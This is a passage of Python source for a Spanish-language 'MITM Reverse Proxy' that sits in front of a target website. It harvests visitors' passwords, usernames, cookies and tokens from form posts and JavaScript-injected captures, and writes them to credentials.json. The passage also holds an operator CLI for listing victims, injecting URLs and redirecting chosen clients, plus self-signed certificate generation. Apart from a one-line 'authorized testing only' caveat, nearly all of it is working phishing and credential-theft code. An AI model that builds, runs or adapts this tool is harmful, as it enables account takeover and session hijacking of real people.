        TK = re.compile(r'(token|access_token|refresh_token|id_token|jwt|api_key|session_id|bearer|secret)',re.I)
        if isinstance(obj, dict):
            for k, v in obj.items():
                f = f"{pfx}.{k}" if pfx else k
                if isinstance(v, str) and TK.search(k) and len(v)>5: r[f] = v[:200]
                elif isinstance(v,(dict,list)): self._find_tk(v, r, f)

    def _js_capture(self):
        try:
            data = freq.get_json(silent=True)
            if not data:
                try: data = json.loads(freq.get_data(as_text=True))
                except: return
            ip = freq.remote_addr
            t  = data.get('t','')
            if t == 'f':
                flds = data.get('d',{})
                if isinstance(flds,dict) and flds:
                    sens = {k:v for k,v in flds.items() if CRED_RE.search(k) and v}
                    if sens: self._log(ip,'FORM_CREDS', data.get('a',''), sens, flds)
            elif t in ('x','h'):
                b = data.get('b','')
                if b: self._sniff_post(ip, b.encode(),'application/x-www-form-urlencoded', data.get('u',''))
        except: pass

    # ──────────────────────────────────────────────────────────────────────────
    #  LOGGING
    # ──────────────────────────────────────────────────────────────────────────
    def _log(self, ip, tipo, url, data, all_f=None):
        self.captures += 1
        cid = self.get_client_id(ip) or '?'
        e   = {'id': self.captures, 'ts': datetime.now().isoformat(),
               'type': tipo, 'ip': ip, 'client_id': cid, 'url': url, 'data': data}
        if all_f: e['all_fields'] = all_f

        if tipo in ('CREDENTIALS','FORM_CREDS'):
            self.credentials.append({'ts':e['ts'],'ip':ip,'client_id':cid,'url':url,'credentials':data})
        if tipo == 'COOKIES':
            if ip not in self.all_cookies: self.all_cookies[ip] = {}
            self.all_cookies[ip].update(data)

        with self.lock:
            try:
                a = []
                if os.path.exists(self.logfile):
                    with open(self.logfile) as f: a = json.load(f)
                a.append(e)
                with open(self.logfile,'w') as f: json.dump(a, f, indent=2, ensure_ascii=False)

                creds_file = os.path.join(BASE, "credentials.json")
                with open(creds_file,'w') as f:
                    json.dump({'credentials': self.credentials,
                               'cookies': {ip: dict(sorted(ck.items())) for ip,ck in self.all_cookies.items()}},
                              f, indent=2, ensure_ascii=False)

                if self.output_file:
                    with open(self.output_file,'a') as f:
                        line = f"[{e['ts']}] [{tipo}] #{cid} {ip} → {url}\n"
                        if tipo in ('CREDENTIALS','FORM_CREDS'):
                            for k,v in data.items(): line += f"  {k}: {v}\n"
                        elif tipo == 'COOKIES':
                            for k,v in data.items(): line += f"  {k}: {v[:60]}\n"
                        f.write(line+"\n")
            except Exception as ex:
                print(f"{R}[!] Log error: {ex}{RST}")

        self._show(e)

    def _show(self, e):
        clrs = {'CREDENTIALS':R,'FORM_CREDS':R,'COOKIES':M,'TOKENS':CY,'POST_DATA':Y}
        c   = clrs.get(e['type'], W)
        cid = e.get('client_id','?')
        print(f"\n{c}{'='*70}")
        print(f"  [{e['type']}] captura #{e['id']} | Cliente #{cid}")
        print(f"{'='*70}{RST}")
        print(f"  {DIM}Hora:{RST} {e['ts']}")
        print(f"  {DIM}IP:{RST}   {e['ip']}")
        print(f"  {DIM}URL:{RST}  {e['url'][:80]}")

        if e['type'] in ('CREDENTIALS','FORM_CREDS'):
            print(f"\n  {R}{BOLD}*** CREDENCIALES ***{RST}")
            for k,v in e['data'].items():
                kl = k.lower()
                if any(x in kl for x in ['pass','pwd','secret','__pwd']):
                    print(f"  {R}{BOLD}  PASSWORD: {v}{RST}")
                elif any(x in kl for x in ['user','email','login','phone','account']):
                    print(f"  {G}{BOLD}  USUARIO:  {v}{RST}")
                elif any(x in kl for x in ['token','auth']):
                    print(f"  {CY}  TOKEN:   {v[:80]}{RST}")
                else:
                    print(f"  {Y}  {k}: {v}{RST}")
            if e.get('all_fields'):
                extra = {k:v for k,v in e['all_fields'].items() if k not in e['data']}
                if extra:
                    print(f"  {DIM}Otros campos:{RST}")
                    for k,v in extra.items(): print(f"  {DIM}  {k}: {v}{RST}")
        elif e['type'] == 'COOKIES':
            print(f"  {M}{BOLD}Cookies:{RST}")
            for k,v in e['data'].items(): print(f"  {M}  {k}: {str(v)[:70]}{RST}")
        elif e['type'] == 'TOKENS':
            print(f"  {CY}Tokens:{RST}")
            for k,v in e['data'].items(): print(f"  {CY}  {k}: {str(v)[:80]}{RST}")
        else:
            for k,v in e['data'].items(): print(f"  {Y}  {k}: {str(v)[:100]}{RST}")
        print(f"{c}{'='*70}{RST}")

    # ──────────────────────────────────────────────────────────────────────────
    #  START
    # ──────────────────────────────────────────────────────────────────────────
    def start(self):
        lip   = _lip()
        proto = "https" if self.certfile and self.keyfile else "http"
        print(f"\n{M}{'='*70}")
        print(f"{'MITM REVERSE PROXY v3.0'.center(70)}")
        print(f"{'='*70}{RST}")
        print(f"  {BOLD}Proxy:{RST}    {proto}://0.0.0.0:{self.port}")
        print(f"  {BOLD}LAN:{RST}      {proto}://{lip}:{self.port}")
        print(f"  {BOLD}Target:{RST}   {self.origin}")
        print(f"  {BOLD}Logs:{RST}     {self.logfile}  /  credentials.json")
        if self.output_file:
            print(f"  {BOLD}Output:{RST}   {self.output_file}")
        if self.follow_redirects:
            print(f"  {BOLD}Mode:{RST}     --fr  (clone ALL cookies por hop)")
        print(f"\n  {DIM}CLI activo → 'help' para comandos | Ctrl+C para detener{RST}")
        print(f"{M}{'='*70}{RST}\n")
        try:
            ctx = None
            if self.certfile and self.keyfile:
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                ctx.load_cert_chain(self.certfile, self.keyfile)
            self.app.run(host='0.0.0.0', port=self.port, debug=False,
                         threaded=True, ssl_context=ctx)
        except KeyboardInterrupt:
            self._end()
        except OSError as e:
            if 'Address already in use' in str(e):
                print(f"{R}[-] Puerto {self.port} en uso → kill -9 $(lsof -ti:{self.port}){RST}")

    def _end(self):
        print(f"\n{M}{'='*70}\n{'RESUMEN'.center(70)}\n{'='*70}{RST}")
        print(f"  Requests: {self.reqs} | Capturas: {self.captures} | Clientes: {len(self.sessions)}")
        for sip, data in self.store.items():
            cid = self.get_client_id(sip) or '?'
            nc  = len(data.get('cookies',{}))
            print(f"  {G}#{cid} {sip}{RST}: {nc} cookies")
        print(f"{M}{'='*70}{RST}\n")


# ═══════════════════════════════════════════════════════════════════════════════
#  CLI INTERACTIVO
# ═══════════════════════════════════════════════════════════════════════════════

def _session_cli(proxy, cid, parent_session):
    """Modo interactivo para una sesión específica (select <ID>)."""
    try:
        from prompt_toolkit import PromptSession
        from prompt_toolkit.completion import WordCompleter
    except: pass

    ip = proxy.get_client_ip(cid)
    if not ip:
        print(f"{R}[!] Cliente #{cid} no encontrado. ¿Ya se conectó?{RST}")
        return

    print(f"\n{CY}  ┌─ Sesión #{cid} ({ip}) ────────────────────────────────┐{RST}")
    print(f"{CY}  │  'exit' o '<' para volver al CLI global              │{RST}")
    print(f"{CY}  └───────────────────────────────────────────────────────┘{RST}\n")

    cmds = WordCompleter(['openurl','redirect','one_redirect','next_redirect',
                          'clean','status','help','exit','<'], ignore_case=True)
    try:
        from prompt_toolkit import PromptSession as PS
        sess = PS(completer=cmds)
    except:
        sess = None

    def _prompt(p):
        if sess:
            return sess.prompt(p).strip()
        return input(p).strip()

    while True:
        try:
            cmd = _prompt(f"#{cid}> ")
            if not cmd: continue

            parts  = cmd.split(None, 1)
            action = parts[0].lower()

            if action in ('exit','<'):
                print(f"{Y}  ← Volviendo al CLI global{RST}\n")
                break

            elif action == 'help':
                print(f"\n{CY}Sesión #{cid} — comandos:{RST}")
                print(f"  {G}openurl <url>{RST}         Cargar URL VÍA PROXY (captura, inyecta)")
                print(f"  {DIM}                        → sitios externos, paths, todo proxied{RST}")
                print(f"  {G}redirect <url>{RST}         Redirigir FUERA del proxy (salida)")
                print(f"  {G}one_redirect <url>{RST}     Salida una vez")
                print(f"  {G}next_redirect <url>{RST}    Salida en siguiente acción real")
                print(f"  {G}clean{RST}                  Limpiar redirects de esta sesión")
                print(f"  {G}status{RST}                 Info del cliente")
                print(f"  {G}exit / <{RST}               Volver al global\n")

            elif action == 'openurl':
                if len(parts) < 2: print(f"{R}Uso: openurl <url>{RST}"); continue
                proxy.openurl(cid, parts[1])

            elif action == 'redirect':
                if len(parts) < 2: print(f"{R}Uso: redirect <url>{RST}"); continue
                proxy.set_redirect(ip, parts[1])

            elif action == 'one_redirect':
                if len(parts) < 2: print(f"{R}Uso: one_redirect <url>{RST}"); continue
                proxy.set_one_redirect(ip, parts[1])

            elif action == 'next_redirect':
                if len(parts) < 2: print(f"{R}Uso: next_redirect <url>{RST}"); continue
                proxy.set_next_redirect(parts[1])

            elif action == 'clean':
                proxy.clean_redirect(ip)

            elif action == 'status':
                with proxy._id_lock:
                    info = dict(proxy._client_info.get(ip, {}))
                cks  = proxy.store.get(ip,{}).get('cookies',{})
                with proxy.redirect_lock:
                    r_perm = proxy.redirects.get(ip) or proxy.redirects.get('global')
                    r_next = proxy.next_redirect
                    r_one  = proxy.one_redirects.get(ip)
                print(f"\n{CY}Cliente #{cid}{RST}")
                print(f"  IP:          {ip}")
                print(f"  First seen:  {info.get('first_seen','?')[:19]}")
                print(f"  Last seen:   {info.get('last_seen','?')[:19]}")
                print(f"  Requests:    {info.get('reqs',0)}")
                print(f"  Cookies:     {len(cks)}")
                for k,v in list(cks.items())[:5]:
                    print(f"    {DIM}{k}: {v[:55]}{RST}")
                if r_perm: print(f"  {G}Redirect:{RST}    {r_perm}")
                if r_next: print(f"  {CY}Next:{RST}        {r_next}")
                if r_one:  print(f"  {Y}One-time:{RST}    {r_one[0]} ({'USADO' if r_one[1] else 'PENDIENTE'})")
                print()

            else:
                print(f"{R}Desconocido: '{action}'. 'help' para ayuda.{RST}")

        except KeyboardInterrupt:
            print(f"\n{Y}  Usa 'exit' o '<' para volver{RST}")
        except EOFError:
            break


def _interactive_cli(proxy):
    try:
        from prompt_toolkit import PromptSession
        from prompt_toolkit.completion import WordCompleter
    except ImportError:
        os.system("pip3 install prompt_toolkit -q")
        from prompt_toolkit import PromptSession
        from prompt_toolkit.completion import WordCompleter

    CMDS = WordCompleter([
        'clients','select','openurl','redirect','next_redirect',
        'one_redirect','clean','status','clear','help','exit'
    ], ignore_case=True)
    session = PromptSession(completer=CMDS)

    def _help():
        print(f"\n{CY}═══ MITM CLI v3.1 ══════════════════════════════════════════{RST}")
        print(f"  {G}clients{RST}                            Listar clientes con IDs")
        print(f"  {G}select <ID>{RST}                        Modo sesión del cliente")
        print()
        print(f"  {CY}── openurl (proxy-interno) ──────────────────────────────{RST}")
        print(f"  {G}openurl all <url>{RST}                  Abre URL en TODOS (via proxy)")
        print(f"  {G}openurl <ID> <url>{RST}                 Abre URL en cliente (via proxy)")
        print(f"  {DIM}  → El browser NO sale. El proxy fetcha, captura, inyecta.{RST}")
        print(f"  {DIM}  → Soporta sitios externos: openurl 1 https://www.ejemplo.com {RST}")
        print()
        print(f"  {CY}── redirect (salida del proxy) ──────────────────────────{RST}")
        print(f"  {G}redirect global <url>{RST}              Manda TODOS a esa URL (sale)")
        print(f"  {G}redirect <ID|ip> <url>{RST}             Manda cliente a URL (sale)")
        print(f"  {G}next_redirect <url>{RST}                Sale en siguiente acción real")
        print(f"  {G}one_redirect <ID|ip> <url>{RST}         Salida una vez (auto-limpia)")
        print(f"  {DIM}  → El browser va a la URL y deja de pasar por el proxy.{RST}")
        print()
        print(f"  {G}clean [global|next|<ID>]{RST}           Limpiar redirect(s)")
        print(f"  {G}status{RST}                             Redirects activos")
        print(f"  {G}clear{RST}                              Limpiar consola")
        print(f"  {G}exit{RST}                               Salir")
        print(f"{CY}══════════════════════════════════════════════════════════{RST}\n")
        print(f"  {DIM}IDs: '3' o '#3'  |  select 2 → todo aplica al cliente #2{RST}\n")

    print(f"\n{CY}MITM CLI v3 activo. 'help' para comandos.{RST}\n")

    while True:
        try:
            cmd = session.prompt('> ').strip()
            if not cmd: continue

            parts  = cmd.split(None, 2)
            action = parts[0].lower()

            if action == 'exit':
                print(f"{Y}Saliendo...{RST}"); break

            elif action == 'help':
                _help()

            elif action == 'clients':
                clients = proxy.list_clients()
                if not clients:
                    print(f"  {DIM}Sin clientes aún. Espera que alguien cargue el proxy.{RST}\n")
                else:
                    print(f"\n{CY}  {'ID':<5} {'IP':<17} {'Reqs':<6} {'Cookies':<8} {'Último'}{RST}")
                    print(f"  {DIM}{'-'*56}{RST}")
                    for c in clients:
                        last = c['last_seen'][11:19] if len(c['last_seen'])>11 else c['last_seen']
                        rdr  = ''
                        with proxy.redirect_lock:
                            if c['ip'] in proxy.redirects: rdr = f"  {CY}[redir]{RST}"
                            if c['ip'] in proxy.one_redirects: rdr = f"  {Y}[onetime]{RST}"
                        print(f"  {G}#{c['id']:<4}{RST} {c['ip']:<17} {c['reqs']:<6} {c['cookies']:<8} {last}{rdr}")
                    print()

            elif action == 'select':
                if len(parts) < 2: print(f"{R}Uso: select <ID>{RST}"); continue
                try:
                    cid = int(parts[1].lstrip('#'))
                    _session_cli(proxy, cid, session)
                except ValueError:
                    print(f"{R}[!] ID debe ser número{RST}")

            elif action == 'openurl':
                if len(parts) < 3:
                    print(f"{R}Uso: openurl all <url>  |  openurl <ID> <url>{RST}"); continue
                target = parts[1].lstrip('#')
                url    = parts[2]
                proxy.openurl('all' if target.lower()=='all' else target, url)

            elif action == 'redirect':
                if len(parts) < 3:
                    print(f"{R}Uso: redirect global <url>  |  redirect <ID|ip> <url>{RST}"); continue
                proxy.set_redirect(parts[1].lstrip('#'), parts[2])

            elif action == 'next_redirect':
                if len(parts) < 2: print(f"{R}Uso: next_redirect <url>{RST}"); continue
                proxy.set_next_redirect(parts[1])

            elif action == 'one_redirect':
                if len(parts) < 3:
                    print(f"{R}Uso: one_redirect <ID|ip> <url>{RST}"); continue
                proxy.set_one_redirect(parts[1].lstrip('#'), parts[2])

            elif action == 'clean':
                proxy.clean_redirect(parts[1].lstrip('#') if len(parts)>1 else None)

            elif action == 'clear':
                os.system('clear' if os.name != 'nt' else 'cls')

            elif action == 'status':
                with proxy.redirect_lock:
                    rds = dict(proxy.redirects)
                    ors = dict(proxy.one_redirects)
                    nr  = proxy.next_redirect
                if not rds and not ors and not nr:
                    print(f"  {DIM}Sin redirects activos{RST}\n")
                else:
                    if rds:
                        print(f"\n{CY}Permanentes:{RST}")
                        for s,t in rds.items():
                            cid = proxy.get_client_id(s) if s!='global' else None
                            lbl = f"#{cid} {s}" if cid else s
                            print(f"  {G}{lbl:<22}{RST} → {t}")
                    if nr:
                        print(f"\n{CY}Next redirect (dispara en siguiente acción):{RST}")
                        print(f"  {CY}{'next':<22}{RST} → {nr}")
                    if ors:
                        print(f"\n{CY}One-time:{RST}")
                        for ip,(t,u) in ors.items():
                            cid = proxy.get_client_id(ip) or '?'
                            st  = f"{R}USADO{RST}" if u else f"{G}PENDIENTE{RST}"
                            print(f"  {G}#{cid} {ip:<15}{RST} → {t} [{st}]")
                    print()

            else:
                print(f"{R}Desconocido: '{action}'. Escribe 'help'.{RST}")

        except KeyboardInterrupt:
            print(f"\n{Y}Usa 'exit' para salir{RST}")
        except EOFError:
            break
        except Exception as e:
            print(f"{R}Error CLI: {e}{RST}")


# ═══════════════════════════════════════════════════════════════════════════════
#  HELPERS
# ═══════════════════════════════════════════════════════════════════════════════
def _lip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(1); s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]; s.close(); return ip
    except: return "127.0.0.1"

def _arg(f, d=None):
    if f in sys.argv:
        try: return sys.argv[sys.argv.index(f)+1]
        except: pass
    return d

def _has_flag(f): return f in sys.argv

def _gen_ssl_cert(cert_path, key_path):
    try:
        from OpenSSL import crypto
    except ImportError:
        os.system("pip3 install pyopenssl -q")
        from OpenSSL import crypto
    k = crypto.PKey(); k.generate_key(crypto.TYPE_RSA, 2048)
    cert = crypto.X509()
    cert.get_subject().CN = "localhost"
    cert.set_serial_number(1000)
    cert.gmtime_adj_notBefore(0); cert.gmtime_adj_notAfter(365*24*60*60)
    cert.set_issuer(cert.get_subject()); cert.set_pubkey(k); cert.sign(k,'sha256')
    with open(cert_path,"wb") as f: f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
    with open(key_path,"wb")  as f: f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))
    print(f"  {G}[+] SSL cert generado: {cert_path}{RST}")


# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════════════════
def main():
    print(f"""
{M}{'='*70}
{'MITM Reverse Proxy v3.0'.center(70)}
{'='*70}{RST}
  {Y}Uso:{RST}
    python3 {os.path.basename(sys.argv[0])} --target ejemplo.com
    python3 {os.path.basename(sys.argv[0])} --target ejemplo.com --port 9090
    python3 {os.path.basename(sys.argv[0])} --target ejemplo.com --ssl
    python3 {os.path.basename(sys.argv[0])} --target ejemplo.com --fr
    python3 {os.path.basename(sys.argv[0])} --target ejemplo.com -O log.txt

  {CY}Flags:{RST}
    --ssl              Auto-genera certificado SSL
    --fr               Follow redirects + clona TODAS las cookies
    --ssl-cert <f>     Certificado SSL manual
    --ssl-key  <f>     Clave SSL manual
    -O [archivo]       Log en texto plano

  {CY}CLI — diferencia clave:{RST}
    {W}openurl{RST}  → abre la URL DENTRO del proxy (proxy la fetcha, captura creds/cookies,
               inyecta JS, reescribe. Browser nunca sale del proxy)
    {W}redirect{RST} → manda el browser a esa URL directamente (sale del proxy, 302 simple)

  {CY}Ejemplos:{RST}
    openurl all https://ejemplo.com    → TODOS ven ejmplo proxied + captura
    openurl 2 /admin                     → cliente #2 va a /admin via proxy
    redirect 1 https://google.com        → cliente #1 sale del proxy a google
    redirect global /path       → todos salen a ese path
    next_redirect https://google.com  → en siguiente click, salen al site
    select 2                             → modo sesión del cliente #2

  {R}Solo para pruebas autorizadas.{RST}
{M}{'='*70}{RST}
""")

    target = _arg('--target')
    port   = int(_arg('--port','8080'))
    sc     = _arg('--ssl-cert')
    sk     = _arg('--ssl-key')
    use_ssl= _has_flag('--ssl')
    fr     = _has_flag('--fr')

    output_file = None
    if '-O' in sys.argv:
        idx = sys.argv.index('-O')
        if idx+1 < len(sys.argv) and not sys.argv[idx+1].startswith('-'):
            output_file = sys.argv[idx+1]
        else:
            output_file = f"mitm_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        print(f"  {G}[+] Log: {output_file}{RST}")

    if not target:
        target = input(f"  {CY}URL objetivo: {RST}").strip()
        if not target: print("[-] Requerida"); sys.exit(1)
    p = input(f"  {CY}Puerto [{port}]: {RST}").strip()
    if p:
        try: port = int(p)
        except: pass

    if use_ssl and not (sc and sk):
        d = os.path.join(BASE,"ssl"); os.makedirs(d, exist_ok=True)
        sc = os.path.join(d,"cert.pem"); sk = os.path.join(d,"key.pem")
        if not os.path.exists(sc): _gen_ssl_cert(sc, sk)

    proxy = MITMProxy(target, port, sc, sk, fr, output_file)

    cli_thread = threading.Thread(target=_interactive_cli, args=(proxy,), daemon=True)
    cli_thread.start()

    proxy.start()


if __name__ == "__main__":
    main()
